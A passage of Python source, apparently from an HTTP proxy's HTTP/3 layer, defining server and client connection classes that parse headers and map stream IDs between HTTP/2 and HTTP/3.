event: {event!r}\")\n            yield from self.h3_conn.transmit()\n\n        # report a protocol error for all remaining open streams when a connection is closed\n        elif isinstance(event, QuicConnectionClosed):\n            self._handle_event = self.done  # type: ignore\n            self.h3_conn.handle_connection_closed(event)\n            msg = event.reason_phrase or error_code_to_str(event.error_code)\n            for stream_id in self.h3_conn.get_open_stream_ids(push_id=None):\n                yield ReceiveHttp(self.ReceiveProtocolError(stream_id, msg))\n\n        else:  # pragma: no cover\n            raise AssertionError(f\"Unexpected event: {event!r}\")\n\n    @expect(HttpEvent, QuicStreamEvent, QuicConnectionClosed)\n    def done(self, _) -> layer.CommandGenerator[None]:\n        yield from ()\n\n    @abstractmethod\n    def parse_headers(self, event: HeadersReceived) -> RequestHeaders | ResponseHeaders:\n        pass  # pragma: no cover\n\n\nclass Http3Server(Http3Connection):\n    ReceiveData = RequestData\n    ReceiveEndOfMessage = RequestEndOfMessage\n    ReceiveProtocolError = RequestProtocolError\n    ReceiveTrailers = RequestTrailers\n\n    def __init__(self, context: context.Context):\n        super().__init__(context, context.client)\n\n    def parse_headers(self, event: HeadersReceived) -> RequestHeaders | ResponseHeaders:\n        # same as HTTP/2\n        (\n            host,\n            port,\n            method,\n            scheme,\n            authority,\n            path,\n            headers,\n        ) = parse_h2_request_headers(event.headers)\n        request = http.Request(\n            host=host,\n            port=port,\n            method=method,\n            scheme=scheme,\n            authority=authority,\n            path=path,\n            http_version=b\"HTTP/3\",\n            headers=headers,\n            content=None,\n            trailers=None,\n            timestamp_start=time.time(),\n            timestamp_end=None,\n        )\n        return RequestHeaders(event.stream_id, request, end_stream=event.stream_ended)\n\n\nclass Http3Client(Http3Connection):\n    ReceiveData = ResponseData\n    ReceiveEndOfMessage = ResponseEndOfMessage\n    ReceiveProtocolError = ResponseProtocolError\n    ReceiveTrailers = ResponseTrailers\n\n    our_stream_id: dict[int, int]\n    their_stream_id: dict[int, int]\n\n    def __init__(self, context: context.Context):\n        super().__init__(context, context.server)\n        self.our_stream_id = {}\n        self.their_stream_id = {}\n\n    def _handle_event(self, event: events.Event) -> layer.CommandGenerator[None]:\n        # QUIC and HTTP/3 would actually allow for direct stream ID mapping, but since we want\n        # to support H2<->H3, we need to translate IDs.\n        # NOTE: We always create bidirectional streams, as we can't safely infer unidirectionality.\n        if isinstance(event, HttpEvent):\n            ours = self.our_stream_id.get(event.stream_id, None)\n            if ours is None:\n                ours = self.h3_conn.get_next_available_stream_id()\n                self.our_stream_id[event.stream_id] = ours\n                self.their_stream_id[ours] = event.stream_id\n            event.stream_id = ours\n\n        for cmd in super()._handle_event(event):\n            if isinstance(cmd, ReceiveHttp):\n                cmd.event.stream_id = self.their_stream_id[cmd.event.stream_id]\n            yield cmd\n\n    def parse_headers(self, event: HeadersReceived) -> RequestHeaders | ResponseHeaders:\n        # same as HTTP/2\n        status_code, headers = parse_h2_response_headers(event.headers)\n        response = http.Response(\n            http_version=b\"HTTP/3\",\n            status_code=status_code,\n            reason=b\"\",\n            headers=headers,\n            content=None,\n            trailers=None,\n            timestamp_start=time.time(),\n            timestamp_end=None,\n        )\n        return ResponseHeaders(event.stream_id, response, event.stream_ended)\n\n\n__all__ = [\n    \"Http3Client\",\n    \"Http3Server\",\n]\n"}